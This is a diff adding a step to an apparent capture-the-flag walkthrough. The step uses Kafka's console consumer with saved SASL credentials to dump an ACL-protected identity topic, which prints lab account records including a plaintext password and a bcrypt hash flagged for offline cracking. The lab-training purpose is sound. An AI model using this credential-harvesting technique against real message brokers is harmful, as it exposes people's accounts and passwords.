@@ -1143,6 +1143,47 @@ aidx.identity.json.v1
 Key finding: `aidx.identity.json.v1` is visible only to the authenticated principal, an ACL-protected topic hidden from anonymous clients. Its name points to account records, making it the next thing to consume.
 <div align="center">
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+### 4.2 Harvest the Identity Topic
+
+Consume the ACL-protected topic from the beginning to read every retained record.
+
+**Command:**
+
+```bash
+/opt/kafka_2.13-4.3.1/bin/kafka-console-consumer.sh \
+  --bootstrap-server 127.0.0.1:9094 \
+  --command-config /tmp/kc.properties \
+  --topic aidx.identity.json.v1 \
+  --from-beginning --timeout-ms 8000
+```
+
+**Breakdown:**
+
+| Component | Purpose | Simple Explanation |
+| --------- | ------- | ------------------ |
+| `kafka-console-consumer.sh` | Read messages | Reads records from a topic and prints them. |
+| `--command-config /tmp/kc.properties` | Authenticate | Reuses the SASL login so the ACL-protected topic is readable. |
+| `--topic aidx.identity.json.v1` | Target topic | The hidden identity topic. |
+| `--from-beginning` | Full replay | Reads from the earliest offset so no retained record is missed. |
+| `--timeout-ms 8000` | Auto-exit | Stops after 8 seconds of no new messages instead of blocking. |
+
+**Result:**
+
+```shell
+{"user_id":"u-10041","username":"deborah.hernandez","email":"deborah.hernandez@autopilot.htb","password":"8F5cgp@tC8g@","algo":"plaintext","status":"active","roles":["ops"]}
+{"user_id":"u-10058","username":"martin_cole","email":"m.okonkwo@aidx.internal","password":"$2b$12$/RNAvZeJj2E16wOLNg9wYOQSY8rpS1Pg3Zy57z9fhB371E0SrYD2y","algo":"bcrypt","cost":12,"status":"active","roles":["ops.app","flightleg"]}
+Processed a total of 2 messages
+```
+
+Key finding: two identity records. `deborah.hernandez` is cleartext but scoped to the `autopilot.htb` domain (not this host), so it is set aside. `martin_cole` is stored as a bcrypt hash at cost 12, a local account with a login shell, so cracking it offline is the route to the user flag.
+
+<div align="center">
+<br>
 <br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
